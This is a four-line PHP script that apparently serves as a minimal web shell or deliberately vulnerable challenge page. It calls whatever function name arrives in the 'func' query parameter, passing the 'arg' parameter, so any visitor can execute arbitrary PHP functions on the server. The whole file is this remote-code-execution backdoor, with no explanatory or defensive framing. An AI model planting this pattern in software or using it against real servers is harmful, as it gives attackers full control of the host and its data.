<?php
$func = @$_GET['func'];
$arg = @$_GET['arg'];
if(isset($func)&&isset($arg)){$func($arg,'');}

